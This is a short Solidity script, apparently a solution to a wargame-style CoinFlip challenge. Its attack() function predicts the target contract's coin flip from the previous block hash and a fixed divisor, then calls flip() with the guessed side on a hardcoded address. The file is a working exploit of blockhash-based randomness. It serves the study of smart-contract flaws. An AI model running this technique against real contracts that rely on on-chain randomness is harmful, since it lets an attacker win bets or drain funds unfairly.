// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../src/CoinFlip.sol';

contract CoinFlipScript {
  CoinFlip target = CoinFlip(0x5Edfa60b4f904595D8d7d3907D16675E4cfEf819);
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


  function attack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    target.flip(side);
  }
}
